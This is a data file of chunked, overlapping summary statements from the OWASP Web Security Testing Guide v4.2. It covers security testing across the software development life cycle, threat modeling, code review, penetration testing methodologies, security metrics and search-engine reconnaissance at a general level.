{"id": "WSTGv4_2-00001", "source": "wstg-v4.2_knowledge.json", "start_item": 0, "end_item": 17, "text": ".Web Security Testing Guide version is 4.2, indicating a specific iteration of the guide.\nContents list includes various important topics such as Principles of Testing, Threat Modeling, and Penetration Testing.\nThe OWASP Testing Project serves as a foundation for various web security testing principles and methodologies.\nPhased approach to testing during different stages of the Software Development Life Cycle (SDLC) is highlighted from the stages before development to maintenance and operations.\nWeb Application Security Testing section is detailed with information gathering techniques to identify vulnerabilities, including conducting reconnaissance and fingerprinting web servers and applications.\nReview old backup and unreferenced files for sensitive information.\nEnumerate infrastructure and application admin interfaces.\nTest HTTP methods: ```code 4.2.6 Test HTTP Methods```\nTest HTTP Strict Transport Security: ```code 4.2.7 Test HTTP Strict Transport Security```\nTest RIA cross domain policy.\nTest file permissions.\nConduct identity management testing: role definitions, user registration, account provisioning, account enumeration, username policy.\nAuthentication testing includes: credentials transport, default credentials, lockout mechanisms, bypassing authentication, remember password vulnerabilities, browser cache weaknesses, password policies, security questions, password resets, weaker authentication.\nAuthorization testing to check for directory traversal, bypassing authorization, privilege escalation, insecure direct object references.\nSession management testing for session schema, cookie attributes, session fixation, exposed session variables, cross site request forgery, logout functionality, session timeout, session puzzling, session hijacking.\nInput validation testing involving reflected and stored cross site scripting, HTTP verb tampering, HTTP parameter pollution, SQL injection for Oracle, MySQL, and SQL Server.\nWeb Security Testing Guide outlines various types of testing approaches for application security.\nSections cover testing methodologies for specific vulnerabilities such as SQL Injection, NoSQL Injection, and Client-side injections."}
{"id": "WSTGv4_2-00002", "source": "wstg-v4.2_knowledge.json", "start_item": 18, "end_item": 45, "text": "L, and SQL Server.\nWeb Security Testing Guide outlines various types of testing approaches for application security.\nSections cover testing methodologies for specific vulnerabilities such as SQL Injection, NoSQL Injection, and Client-side injections.\nCode snippets in the guide provide examples of specific testing techniques like HTTP Splitting and Smuggling, and HTTP Incoming Requests.\nTesting for weak cryptography includes multiple checks such as transport layer security and cryptographic strength evaluations.\nBusiness Logic Testing involves critical assessments like data validation, request forging, and integrity checks.\nClient-side Testing focuses on issues related to DOM manipulation, Cross Site Scripting (XSS), and Clickjacking.\nWebSocket Testing\nWeb Messaging Testing\nBrowser Storage Testing\nCross Site Script Inclusion testing\nAPI Testing\nGraphQL Testing\nReporting methodology\nTesting Tools Resource\nSuggested Reading for further learning\nFuzz Vectors for testing\nEncoded Injection techniques\nHistory of web security\nLeveraging Developer Tools for testing\nWeb applications have compounded the need for a robust approach to security.\nOWASP aims to make insecure software the exception rather than the rule.\nTesting is a critical part of building secure applications, yet many organizations neglect it.\nSecurity testing alone cannot measure the overall security of an application due to the infinite number of attack vectors.\nOWASP Testing Guide aims to provide a consistent and effective approach to security testing.\nCollaboration among experts is key to developing comprehensive security testing practices.\nThe guide's availability as a free and open resource is crucial for fostering widespread understanding of security testing techniques.\nDevelopers bear the primary responsibility for application security, as they create the code.\nKeeping the guide up to date is vital to address the evolving application security threat landscape.\nThe guide is intended to be tailored to fit an organization's specific technologies, processes, and structure.\nDevelopers should use the guide to ensure secure coding practices as part of normal test procedures."}
{"id": "WSTGv4_2-00003", "source": "wstg-v4.2_knowledge.json", "start_item": 46, "end_item": 59, "text": "application security threat landscape.\nThe guide is intended to be tailored to fit an organization's specific technologies, processes, and structure.\nDevelopers should use the guide to ensure secure coding practices as part of normal test procedures.\nSoftware testers and QA can expand their test cases using this guide, which can save time and effort in catching vulnerabilities early.\nSecurity specialists can use the guide alongside other techniques to verify application security.\nProject Managers should understand security issues manifest through bugs in code and design.\nSecurity testing should be continuously reprioritized based on limited resources and the potential risks to the organization.\nThe guide is not a checklist but offers techniques to find different types of security holes, as new vulnerabilities continuously arise.\nAutomated security analysis tools have limitations and are generic, often failing to detect unique issues within custom code.\nThe most serious security flaws are often not generic, but are highly specific to business logic and application design.\nWhile automated tools can find many potential issues, they require time to investigate and verify each one, necessitating a strategic approach to their use in security testing.\nImage: img_page11_1.png\nThe OWASP Testing Project aims to enhance understanding of web application testing through a comprehensive framework.\nThe Testing Guide provides a detailed framework and methodologies for testing web applications, focusing on integration within the software development life cycle rather than just penetration testing.\nThe introduction outlines the importance of measuring security, stating that you can't control what you can't measure, highlighting the challenges in quantifying security issues in monetary terms.\nThe economics of insecure software is addressed, with reference to a quote emphasizing the financial impact of software vulnerabilities.\nIn 2018, the cost of poor quality software in the US was estimated at approximately $2.84 trillion, signifying the importance of measuring security as part of the development process."}
{"id": "WSTGv4_2-00004", "source": "wstg-v4.2_knowledge.json", "start_item": 60, "end_item": 78, "text": "uote emphasizing the financial impact of software vulnerabilities.\nIn 2018, the cost of poor quality software in the US was estimated at approximately $2.84 trillion, signifying the importance of measuring security as part of the development process.\nImportance of web application security testing due to exposure to millions of users.\nDefinition of 'testing' from the Oxford Dictionary of English as a procedure to establish quality, performance, or reliability.\nTesting is a process of comparing a system's state against a set of criteria.\nSecurity testing is often perceived as a 'black art' due to lack of well-defined criteria.\nPurpose of the guide is to change perceptions and assist those without in-depth knowledge in effective testing.\nTesting programs help organizations identify steps for building and operating web application security programs.\nThe guide acts as both a reference and methodology for comparing against industry best practices.\nMost common testing occurs post-deployment, which is ineffective; security should be integrated into all SDLC phases.\nAdoption of a Software Development Life Cycle (SDLC) model is recommended for effective testing and vulnerabilities prevention.\nThe importance of integrating security into the Software Development Life Cycle (SDLC).\nSDLC should include security tests to assess control effectiveness throughout development.\nSoftware development comprises people, process, and technology.\nEffective testing programs should focus on testing people, processes, and technology.\nImage: img_page15_1.jpeg\nHolistic approach in security testing is necessary to uncover both management and operational vulnerabilities.\nTesting only technical implementations can lead to an incomplete security assessment.\nAnalogy compares application safety testing to car safety testing, emphasizing the need for comprehensive testing in various scenarios.\nWSTG scenarios have a specific identifier format: WSTG-<category>-<number> for test categorization.\nIdentifying versioned links for referencing scenarios is vital due to potential identifier changes in future versions."}
{"id": "WSTGv4_2-00005", "source": "wstg-v4.2_knowledge.json", "start_item": 79, "end_item": 92, "text": "e testing in various scenarios.\nWSTG scenarios have a specific identifier format: WSTG-<category>-<number> for test categorization.\nIdentifying versioned links for referencing scenarios is vital due to potential identifier changes in future versions.\nThere is no 'silver bullet' solution for application security; reliance on tools alone is insufficient for thorough assessments.\nSecurity is a continuous process rather than a static product; maturity of security assessment tools is limited.\nSecurity professionals should focus on strategic, holistic approaches instead of the outdated patch-and-penetrate model for vulnerability management.\nVulnerability studies indicate that the time between discovering a vulnerability and its exploitation is decreasing, leading to shorter windows of vulnerability.\nCommon misconceptions exist regarding patch management, including the belief that patches can disrupt normal operations or that users are aware of all available patches.\nIt is important to integrate security practices throughout the Software Development Life Cycle (SDLC) to avoid recurring security issues.\nDevelopers should create security standards and guidelines that align with their development methodologies.\nSecurity considerations should be included in each phase of the SDLC to ensure a comprehensive security strategy.\nThere are both descriptive and prescriptive secure SDLC frameworks available, with different applications based on the maturity of an organization's SDLC process.\nImage: img_page17_1.png\nIt is crucial to educate development and QA teams on common security issues to detect and prevent security bugs early in the SDLC.\nIntegrating security tests into CI/CD workflows helps maintain baseline security information and identify weaknesses.\nDynamic application security testing (DAST), static application security testing (SAST), and software composition analysis (SCA) are methods to automate security testing in development.\nUnderstanding the scope of security involves classifying assets according to their required protection levels (e.g., confidential, secret, top secret) and considering applicable regulations."}
{"id": "WSTGv4_2-00006", "source": "wstg-v4.2_knowledge.json", "start_item": 93, "end_item": 109, "text": "A) are methods to automate security testing in development.\nUnderstanding the scope of security involves classifying assets according to their required protection levels (e.g., confidential, secret, top secret) and considering applicable regulations.\nCreative thinking is essential for security testing, as it allows testers to think like attackers and identify unexpected vulnerabilities.\nAccurate documentation of the application architecture and use cases is necessary for a robust security program.\nUsing the right tools to automate routine security tasks can help streamline the security process, but users must understand their limitations.\nA thorough security review is necessary, avoiding superficial assessments that could lead to false confidence about application security.\nEvery section of application logic and use case scenarios should be tested for vulnerabilities.\nUsing source code is more effective than black-box testing for identifying vulnerabilities.\nDeveloping metrics is vital to measure improvements in the security program.\nGood metrics can highlight the need for more education and training or clarify misunderstood security mechanisms.\nConsistent metrics help assess the effectiveness of measures introduced to reduce security bugs.\nDocumentation of the test results is crucial for transparency and understanding among stakeholders.\nReports should convey material risks to business owners while offering technical insights for developers.\nUsing a standardized report template can save time and ensure accurate documentation of test results.\nTesting techniques overview includes Manual Inspections, Threat Modeling, Code Review, and Penetration Testing.\nManual inspections are human reviews that assess security implications of people, policies, and processes.\nManual inspections can also review technology decisions like architectural designs through documentation analysis and interviews.\nThey are powerful techniques that provide insights into security by asking how and why something is implemented.\nThese inspections can test the software development life-cycle and ensure adequate policies and skills are in place."}
{"id": "WSTGv4_2-00007", "source": "wstg-v4.2_knowledge.json", "start_item": 110, "end_item": 126, "text": "ysis and interviews.\nThey are powerful techniques that provide insights into security by asking how and why something is implemented.\nThese inspections can test the software development life-cycle and ensure adequate policies and skills are in place.\nA trust-but-verify model is recommended for manual inspections to validate the accuracy of information provided.\nManual inspections help evaluate understanding of security processes, awareness of policies, and skills in secure application design.\nAdvantages of manual inspections include: no supporting technology needed, versatility, flexibility, promotes teamwork, and early evaluation in the SDLC.\nDisadvantages include time consumption, unavailability of supporting material, and the need for skilled human thought.\nThreat modeling assists designers in identifying security threats and developing mitigation strategies.\nIt is seen as a risk assessment for applications, helping prioritize resources on critical vulnerabilities.\nThreat models should be documented and revisited throughout the SDLC.\nRecommended steps for threat modeling include decomposing the application, defining and classifying assets, exploring vulnerabilities, identifying threats, and creating mitigation strategies.\nOutput from a threat model is typically lists and diagrams.\nVarious Open Source projects and commercial products support application threat modeling methodologies.\nThere is no one correct way to develop threat models and perform information risk assessments.\nAdvantages of threat modeling include a practical attacker view, flexibility, and application early in the SDLC.\nDisadvantages of threat modeling include that good threat models do not guarantee good software.\nSource code review is a process of manually checking a web application's source code for security issues.\nMany serious security vulnerabilities can only be found through source code review.\nSource code analysis allows testers to understand the code's operations and identify security problems more accurately than black-box testing.\nCommon issues found through source code reviews include concurrency problems, flawed business logic, and access control issues."}
{"id": "WSTGv4_2-00008", "source": "wstg-v4.2_knowledge.json", "start_item": 127, "end_item": 145, "text": " allows testers to understand the code's operations and identify security problems more accurately than black-box testing.\nCommon issues found through source code reviews include concurrency problems, flawed business logic, and access control issues.\nSource code analysis is efficient for finding implementation issues like input validation failures.\nSource code analysis can miss issues in compiled libraries and cannot easily detect runtime errors.\nPenetration testing is also known as black-box testing or ethical hacking.\nPenetration testing aims to find security vulnerabilities in a system or application without prior knowledge of its inner workings.\nTesters act like attackers, attempting to find and exploit vulnerabilities, often using valid accounts.\nPenetration testing effectiveness varies for networks and applications; bespoke web applications require more research-oriented testing.\nAutomated tools exist for penetration testing, but they may be less effective for custom web applications.\nPenetration testing should not be the only testing method; it can identify only a small sample of potential risks.\nA balanced testing approach is needed that includes manual reviews, technical testing, and CI/CD integrated testing throughout the SDLC.\nWhile penetration testing is valuable, it is usually too late in the Software Development Life Cycle (SDLC) and focused mainly on front-impact testing.\nCompanies must emphasize early stages of development in web security testing.\nFigure 2-3 presents the proportional representation of testing effort in the Software Development Life Cycle (SDLC).\nImage: img_page23_1.png\nWeb application scanners have limitations despite their usefulness in testing.\nThe OWASP Benchmark Project evaluates automated vulnerability detection tools.\nAutomated black-box testing may not be fully effective due to issues like hidden logic, such as administrative backdoors.\nExample provided of a vulnerable web application with a parameter that grants unauthorized access when a specific value is inputted.\nImage: img_page24_1.png\nMagic Parameter check vulnerable code example highlights security risks in web applications."}
{"id": "WSTGv4_2-00009", "source": "wstg-v4.2_knowledge.json", "start_item": 146, "end_item": 160, "text": "\nExample provided of a vulnerable web application with a parameter that grants unauthorized access when a specific value is inputted.\nImage: img_page24_1.png\nMagic Parameter check vulnerable code example highlights security risks in web applications.\nSecurity vulnerabilities can be discovered through manual code reviews, which are more effective than black-box testing methods.\nStatic source code analysis tools have limitations and cannot completely substitute for manual reviews, as they may miss design flaws.\nTo implement an effective security testing program, it is crucial to define clear testing objectives rooted in security requirements.\nSecurity requirements can be derived from standards, positive and negative application requirements, and drive testing throughout the software development lifecycle (SDLC).\nObjectives of security testing include validating security control functionality and ensuring minimal vulnerabilities according to established guidelines like the OWASP Top Ten.\nUnderstanding of business requirements is essential for documenting security requirements.\nA security section in the business requirements should protect customer data and comply with applicable regulations, standards, and policies.\nCompliance regulations can be identified based on the business sector and operational location.\nFor financial applications, compliance with FFIEC requires mitigation of weak authentication risks with multi-layered security controls.\nPCI DSS forbids storing PINs and CVV2 data and requires protecting sensitive data with encryption.\nPassword complexity requirements should be enforced to comply with information security standards.\nValidation of security requirements is a critical part of security testing and information security assessments.\nInformation security assessments aim to identify gaps in security controls and perform risk analysis.\nEncryption standards detailed in organizational policies must be adhered to, including acceptable algorithms and key lengths.\nDifferent security testing methodologies (threat modeling, secure code analysis, penetration testing) target various phases of the SDLC for effective security requirement validation."}
{"id": "WSTGv4_2-00010", "source": "wstg-v4.2_knowledge.json", "start_item": 161, "end_item": 175, "text": "ust be adhered to, including acceptable algorithms and key lengths.\nDifferent security testing methodologies (threat modeling, secure code analysis, penetration testing) target various phases of the SDLC for effective security requirement validation.\nSQL injection vulnerabilities can be validated through SQL exceptions and manual injection of attack vectors.\nSource code analysis can expedite the construction of SQL attack vectors for exploiting vulnerabilities.\nThreats and countermeasures can be categorized using STRIDE: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, and Elevation of privilege.\nRoot causes of vulnerabilities include security flaws in design, coding bugs, and insecure configurations.\nSecure coding standards can help document security requirements and validate them during code reviews.\nA vulnerability knowledge base can track vulnerabilities by type, issue, mitigation, root cause, and application.\nRisk ratings of vulnerabilities can inform remediation strategies, prioritizing high and medium risks for immediate attention.\nThreat scenarios based on common vulnerabilities can guide security testing and test case development.\nFunctional security requirements are driven by standards, policies, and regulations, referred to as 'positive requirements'.\nExamples of positive requirements include account lockout after failed logins and minimum password complexity.\nSecurity requirements need to be function-driven, highlighting the expected functionality and implying the implementation details.\nHigh-level security design requirements for authentication include protecting user credentials, masking sensitive data, and locking accounts after failed attempts.\nRisk-driven security requirements focus on validating unexpected behavior, or 'negative requirements', such as preventing unauthorized data alteration.\nNegative requirements are more challenging to test as they lack defined expected behaviors; they rely on risk analysis and threat modeling to identify test conditions.\nExamples of negative requirements include preventing unauthorized financial transactions and data destruction."}
{"id": "WSTGv4_2-00011", "source": "wstg-v4.2_knowledge.json", "start_item": 176, "end_item": 195, "text": "re challenging to test as they lack defined expected behaviors; they rely on risk analysis and threat modeling to identify test conditions.\nExamples of negative requirements include preventing unauthorized financial transactions and data destruction.\nSecurity testing must involve documenting threat scenarios and the functionality of countermeasures to mitigate risks, especially for authentication controls.\nLock out accounts after reaching a log on failure threshold to mitigate brute force password attacks.\nEnforce password complexity to enhance security and reduce risk.\nDisplay generic error messages to mitigate account harvesting or enumeration risk.\nMutually authenticate client and server to prevent non-repudiation and MitM attacks.\nUtilize threat modeling tools like threat trees and attack libraries to derive negative test scenarios.\nA threat tree identifies root attacks and exploits of security controls with countermeasures needed to mitigate identified vulnerabilities.\nUse cases describe intended application functionality, while misuse cases describe malicious exploitation scenarios.\nMisuse scenarios allow analysis of potential vulnerabilities from an attacker's viewpoint.\nIdentifying critical use and misuse cases drives documentation of security requirements and necessary controls to mitigate risks.\nStep-by-step methodology for deriving security requirements from use and misuse cases includes describing functional and negative scenarios.\nGraphical representations of use and misuse cases assist in deriving countermeasures against identified threats.\nSteps for eliciting security requirements include:\n1. Password requirements must adhere to current complexity standards.\n2. Accounts must be locked out after five unsuccessful login attempts.\n3. Login error messages must remain generic to enhance security.\nSecurity requirements should be documented and tested.\nImage: img_page30_1.png\nSecurity testing during the development phase is crucial for identifying vulnerabilities before integration.\nSoftware components include functions, methods, classes, APIs, libraries, and executables."}
{"id": "WSTGv4_2-00012", "source": "wstg-v4.2_knowledge.json", "start_item": 196, "end_item": 212, "text": " be documented and tested.\nImage: img_page30_1.png\nSecurity testing during the development phase is crucial for identifying vulnerabilities before integration.\nSoftware components include functions, methods, classes, APIs, libraries, and executables.\nDevelopers can utilize source code analysis for static verification of vulnerabilities and adherence to secure coding standards.\nDynamic verification involves security unit tests to ensure components function as expected at runtime.\nSenior developers usually lead secure code reviews to decide on code acceptance into the application build.\nA defect management system is often used to track security bugs.\nIntegrated tests assess the security functionality of the application and potential vulnerabilities as a whole entity.\nSecurity testing methods include white-box testing (source code analysis), black-box testing (penetration testing), and gray-box testing (partial knowledge of the application).\nTesting engineers are typically responsible for performing security tests during system integration tests.\nDocumentation of security test cases is mandated within security testing guidelines.\nQA testers handle functional testing, while security testing is often conducted by ethical hackers or specialized teams.\nAddressing security issues is critical before application deployment to production, with an emphasis on high-risk vulnerabilities.\nObjective of security tests is to validate compliance with secure coding standards.\nSecurity requirements should be documented and validated with static and dynamic analysis.\nUnit tests can validate code changes required by secure code reviews.\nSecure code reviews and source code analysis tools help identify security issues in code development.\nBest practice involves creating a generic security test suite as part of unit testing frameworks.\nSecurity test cases should validate positive and negative requirements for security controls.\nKey areas for validation include identity, authentication & access control, input validation & encoding, encryption, user and session management, error and exception handling, and auditing and logging."}
{"id": "WSTGv4_2-00013", "source": "wstg-v4.2_knowledge.json", "start_item": 213, "end_item": 230, "text": "and negative requirements for security controls.\nKey areas for validation include identity, authentication & access control, input validation & encoding, encryption, user and session management, error and exception handling, and auditing and logging.\nUnit testing frameworks like JUnit, NUnit, and CUnit can be adapted for security test requirements.\nTest cases verify functionality of security controls at the software component level.\nThreat scenarios from use and misuse cases guide testing procedures for software components.\nComponent-level tests can validate positive assertions and ensure secure error handling avoiding system vulnerabilities.\nDocumentation of threat scenarios for common vulnerabilities is essential for developers.\nSecurity test cases can verify implementations of code changes against secure coding requirements.\nSource code analysis and unit tests validate that code changes mitigate previously identified vulnerabilities.\nAutomated secure code analysis can act as automatic check-in gates to prevent code with high severity issues from being integrated.\nIntegrated system tests aim to validate the 'defense in depth' concept by testing security controls across different layers.\nIntegration testing can help identify input validation issues linked to coding vulnerabilities.\nSecurity testing simulates real attack scenarios by malicious users in the application environment.\nSecurity tests can be classified as ethical hacking tests focused on validating real vulnerability exposure.\nOrganizations may need to train software developers on ethical hacking and security assessment procedures.\nA 'security test cases cheat sheet' can guide testers in identifying common vulnerabilities such as SQL injection and XSS.\nBasic security tests might include manual error forcing to understand application behavior during exceptional states.\nIn-depth security assessments may leverage tools and techniques such as fault injection and fuzz testing.\nUser acceptance (UAT) testing environments are practical for conducting security tests representative of real configurations.\nSecurity testing metrics are important for risk analysis and management processes."}
{"id": "WSTGv4_2-00014", "source": "wstg-v4.2_knowledge.json", "start_item": 231, "end_item": 247, "text": "such as fault injection and fuzz testing.\nUser acceptance (UAT) testing environments are practical for conducting security tests representative of real configurations.\nSecurity testing metrics are important for risk analysis and management processes.\nMeasuring total vulnerabilities found can quantify an application's security posture.\nGoals for security testing may include reducing vulnerabilities before deployment.\nComparing current application security against a baseline can help assess improvements.\nSecurity and software quality can have similar defect management and reporting categorizations.\nCategorizing security defects by threat, exposure, and potential impact helps determine risk.\nMeasuring risk can guide business management's decisions on risk acceptance, mitigation, or transfer.\nApplication size correlates with the number of issues found during testing, emphasizing the need for larger applications to be tested more often.\nVarious phases of the SDLC should incorporate security testing to detect vulnerabilities early and reduce future fix costs.\nContainment metrics measure the effectiveness of security assessments in maintaining security during the development process.\nSpecific goals for security test metrics include reducing vulnerabilities by a certain percentage or fixing issues by deadlines.\nSecurity test data can be absolute (e.g., number of vulnerabilities) or comparative (e.g., comparing vulnerabilities detected in different testing methods).\nEstablishing a baseline is crucial for assessing security process quality.\nSecurity test data supports objectives like compliance with regulations, identifying root causes of security issues, and process improvements.\nMetrics from security test data help analyze software security and process effectiveness.\nQuestions that can be answered using security test data include vulnerability reduction, comparisons with similar products, and effectiveness of different security activities.\nA tool taxonomy is important for choosing the right security tools for testing.\nRelying solely on automated tools can give a false sense of security; skilled testers are essential."}
{"id": "WSTGv4_2-00015", "source": "wstg-v4.2_knowledge.json", "start_item": 248, "end_item": 264, "text": "similar products, and effectiveness of different security activities.\nA tool taxonomy is important for choosing the right security tools for testing.\nRelying solely on automated tools can give a false sense of security; skilled testers are essential.\nReporting requirements include categorizing vulnerabilities and understanding their severity using CVSS.\nDescribing the root cause of security issues helps identify what needs fixing, especially in white-box testing.\nReporting on vulnerabilities should include guidance for developers on how to re-test and validate vulnerabilities.\nThe remediation details should be comprehensive, including secure coding examples and configuration changes.\nSeverity ratings contribute to risk assessment and help prioritize remediation efforts based on impact and exposure.\nSecurity test metrics should provide value to various stakeholders including developers, project managers, information security officers, auditors, and CIOs.\nDevelopers utilize security test data to support secure coding practices and advocacy for security training and tools.\nProject managers use metrics to track project schedules and improve delivery timelines.\nSecurity metrics provide compliance assurance for auditors and help demonstrate adherence to standards.\nCIOs and CISOs focus on the ROI of security activities by evaluating the cost-benefit relationship in mitigating vulnerabilities and their associated risks.\nOWASP Testing Framework\nPhases of Web Security Testing: 1. Before Development Begins, 2. During Definition and Design, 3. During Development, 4. During Deployment, 5. During Maintenance and Operations\nTypical SDLC Testing Workflow\nPenetration Testing Methodologies\nThe section describes a typical web security testing framework that organizations can develop to enhance their testing process during the software development life cycle (SDLC).\nThe framework is flexible and can be tailored to fit an organization’s development process and culture.\nA complete strategic testing process is crucial for assessing and improving software security, moving beyond just black-box testing."}
{"id": "WSTGv4_2-00016", "source": "wstg-v4.2_knowledge.json", "start_item": 265, "end_item": 277, "text": "cycle (SDLC).\nThe framework is flexible and can be tailored to fit an organization’s development process and culture.\nA complete strategic testing process is crucial for assessing and improving software security, moving beyond just black-box testing.\nSecurity testing should happen early in the application development phases, not just after the application is developed.\nPenetration testing is acknowledged but considered inefficient for finding many bugs; it should be complementary to holistic security practices.\nDevelopment methodologies mentioned include Rational Unified Process, eXtreme, Agile development, and traditional waterfall methodologies, with no specific methodology being preferred by the guide.\nThe testing framework includes phases: Before development begins, During definition and design, During development, During deployment, and During maintenance and operations.\nImportance of having coding standards like Java secure coding standard and cryptography standard for developing applications.\nNeed for documenting common issues to reduce decision-making during development.\nIt's crucial to define measurement and metrics criteria before development begins to track defects in processes and products.\nSecurity requirements must be clearly defined and tested to identify gaps in application security.\nKey areas to review for security requirements include user management, authentication, authorization, data confidentiality, integrity, accountability, session management, transport security, and compliance with standards.\nDocumentation of design and architecture is essential for ensuring security; flaws should be identified early in the design phase.\nEfficiency in fixing design flaws can be improved by centralizing security mechanisms like authorization and input validation processes.\nUsing UML models to describe application functionality helps ensure a shared understanding among system designers and allows for identification of weaknesses.\nPhase 2.4 involves creating and reviewing threat models based on system design and architecture, analyzing threats to ensure mitigation or acceptance by the business."}
{"id": "WSTGv4_2-00017", "source": "wstg-v4.2_knowledge.json", "start_item": 278, "end_item": 293, "text": "d understanding among system designers and allows for identification of weaknesses.\nPhase 2.4 involves creating and reviewing threat models based on system design and architecture, analyzing threats to ensure mitigation or acceptance by the business.\nDuring development, design decisions may arise that were not initially covered; hence, adequate design and architecture are crucial.\nPhase 3.1 highlights the importance of code walkthroughs where developers explain the code's logic and flow, aiding in the understanding of structure without performing a detailed code review.\nPhase 3.2 emphasizes that code reviews are focused on examining code for security defects, validating against checklists and best practices.\nStatic code reviews can yield high-quality returns on resources invested compared to other security review methods but should be part of a comprehensive testing strategy.\nRegulatory requirements mentioned include Sarbanes-Oxley 404, COPPA, ISO/IEC 27002, among others, indicating the need for compliance in security processes.\nPhase 5 of the Web Security Testing involves Maintenance and Operations.\nOperational Management Reviews should detail the management of application and infrastructure.\nPeriodic Health Checks should occur monthly or quarterly to identify new security risks and ensure security levels are maintained.\nChange Verification is essential after any changes in production, integrated with the change management process.\nThe page refers to the 'Web Security Testing Guide v4.2'.\nThere is an image referenced as 'Figure 3-1', which illustrates a typical SDLC (Software Development Life Cycle) testing workflow.\nImage: img_page42_1.png\nOWASP testing guides recommended for technical security testing execution.\nDifferent OWASP guides are available based on application types: web/cloud services, mobile apps (Android/iOS), IoT firmware.\nPenetration Testing Execution Standard (PTES) includes 7 phases: Pre-engagement Interactions, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post Exploitation, and Reporting.\nPTES Technical Guidelines provide hands-on suggestions on testing procedures and security testing tools."}
{"id": "WSTGv4_2-00018", "source": "wstg-v4.2_knowledge.json", "start_item": 294, "end_item": 317, "text": "es: Pre-engagement Interactions, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post Exploitation, and Reporting.\nPTES Technical Guidelines provide hands-on suggestions on testing procedures and security testing tools.\nPCI DSS Requirement 11.3 defines penetration testing and includes specific guidance for penetration testing.\nPenetration Testing Framework (PTF) provides a comprehensive guide for hands-on penetration testing.\nPTF lists usages of security testing tools across various testing categories including network footprinting, vulnerability assessment, and password cracking.\nPCI DSS requirement 11.3 includes coverage for critical systems and requires both external and internal testing.\nPenetration testing methodologies encompass various areas such as application-layer testing and network-layer tests.\nTechnical Guide to Information Security Testing and Assessment by NIST includes techniques for target identification, vulnerability validation, and security assessment planning.\nOpen Source Security Testing Methodology Manual (OSSTMM) is a comprehensive methodology for operational security testing.\nOSSTMM covers various areas such as physical locations, workflow, human security, physical security, wireless security, telecommunications security, data networks security, and compliance.\nKey sections of OSSTMM include:\n- Security Analysis\n- Operational Security Metrics\n- Trust Analysis\n- Workflow\n- Human Security Testing\n- Physical Security Testing\n- Wireless Security Testing\n- Telecommunications Security Testing\n- Data Networks Security Testing\n- Compliance Regulations\n- Reporting with the STAR (Security Test Audit Report)\nThe page is from the Web Security Testing Guide v4.2, focusing on web application security testing.\nSection 4.0 provides an introduction and objectives of the security testing process.\nSection 4.1 covers information gathering techniques for security assessments.\nAdditional sections include methods for testing configuration, identity management, authentication, authorization, and session management."}
{"id": "WSTGv4_2-00019", "source": "wstg-v4.2_knowledge.json", "start_item": 318, "end_item": 333, "text": " of the security testing process.\nSection 4.1 covers information gathering techniques for security assessments.\nAdditional sections include methods for testing configuration, identity management, authentication, authorization, and session management.\nFurther sections address input validation, error handling, cryptography weaknesses, business logic, and client-side testing.\nDescription of the OWASP web application security testing methodology.\nDefinition and explanation of web application security testing as a process to evaluate security weaknesses.\nDefinition of a vulnerability as a flaw or weakness in a system that may be exploited.\nDefinition of a threat as a potential risk to application assets that exploits vulnerabilities.\nDefinition of a test as an action to demonstrate compliance with security requirements.\nThe OWASP approach to methodology is open and collaborative, encouraging participation and idea sharing.\nCharacteristics of the testing methodology include consistency, reproducibility, rigor, and quality control.\nEmphasis on documenting problems, testing known vulnerabilities, and all security testing activities.\nTester refers to the individual who carries out the testing activities.\nTools and methodology form the core of the Testing Guide project.\nTesting can be classified into two main types: Passive Testing and Active Testing.\nPassive Testing involves understanding the application’s logic by exploring it as a user and using tools for information gathering, such as HTTP proxies to observe requests and responses.\nAt the end of Passive Testing, the tester should gain a comprehensive understanding of access points and functionality of the system.\nExample of a URL for discovering an authentication form: `https://www.example.com/login/auth_form`.\nIdentification of access points through parameters as seen in the URL: `https://www.example.com/appx?a=1&b=1`."}
{"id": "WSTGv4_2-00020", "source": "wstg-v4.2_knowledge.json", "start_item": 334, "end_item": 348, "text": "points and functionality of the system.\nExample of a URL for discovering an authentication form: `https://www.example.com/login/auth_form`.\nIdentification of access points through parameters as seen in the URL: `https://www.example.com/appx?a=1&b=1`.\nList of active testing categories includes: Information Gathering, Configuration and Deployment Management Testing, Identity Management Testing, Authentication Testing, Authorization Testing, Session Management Testing, Input Validation Testing, Error Handling, Cryptography, Business Logic Testing, Client-side Testing, and API Testing.\nThis section covers various methods used in web security testing, specifically focusing on information gathering.\nKey techniques include Search Engine Discovery, Fingerprinting web servers and applications, and reviewing metadata for potential information leakage.\nIdentifying application entry points and mapping execution paths are critical for understanding application behavior during testing.\nThe section emphasizes the importance of enumeration and architecture mapping for effective security assessments.\nSearch engines use robots to crawl web pages and fetch data.\nWebsites can utilize a robots.txt file to prevent search engines from indexing certain pages.\nReconnaissance can be direct (searching indexes) or indirect (gathering sensitive info from forums).\nSearch engine indexing is based on HTML tags and attributes, and outdated robots.txt files may lead to unintentional exposure of sensitive information.\nWebsite owners can use robots.txt, HTML meta tags, and authentication to secure sensitive content.\nTest objectives include identifying exposed sensitive design and configuration information.\nPotential sensitive information to search for includes network diagrams, archived communications, logon procedures, usernames and passwords, and error messages.\nDifferent search engines may yield different results, so a variety of search engines should be utilized during testing.\nbinsearch.info: A search engine for binary Usenet newsgroups.\nCommon Crawl: An open repository of web crawl data accessible for analysis."}
{"id": "WSTGv4_2-00021", "source": "wstg-v4.2_knowledge.json", "start_item": 349, "end_item": 372, "text": "nt search engines may yield different results, so a variety of search engines should be utilized during testing.\nbinsearch.info: A search engine for binary Usenet newsgroups.\nCommon Crawl: An open repository of web crawl data accessible for analysis.\nDuckDuckGo: A privacy-focused search engine that compiles results from various sources, supporting search syntax.\nGoogle: The world’s most popular search engine that uses a ranking system to return relevant results and supports search operators.\nInternet Archive Wayback Machine: A digital library of Internet sites and cultural artifacts.\nStartpage: A search engine that uses Google’s results while maintaining user privacy through the absence of tracking.\nShodan: A service for searching Internet-connected devices and services.\nSearch Operators: Special keywords that extend regular search query capabilities, examples include:\n- site: to limit search to a domain.\n- inurl: to find keywords in URLs.\n- intitle: to find keywords in page titles.\n- intext: or inbody: to search for keywords in page bodies.\n- filetype: to match specific file types.\nExample syntax for a search: site:owasp.org.\nImage: img_page51_1.png\nViewing cached content can be done using the cache: operator in search engines.\nThe syntax to view a cached webpage, like owasp.org, is cache:owasp.org.\nGoogle Hacking, also known as Dorking, utilizes search operators to discover sensitive files and information.\nOperators can be chained together for more effective searches in Google hacking.\nThe Google Hacking Database is a valuable resource for discovering specific types of sensitive information, categorized under different dorks.\nImage: img_page52_1.png\nDatabases for search engines like Bing and 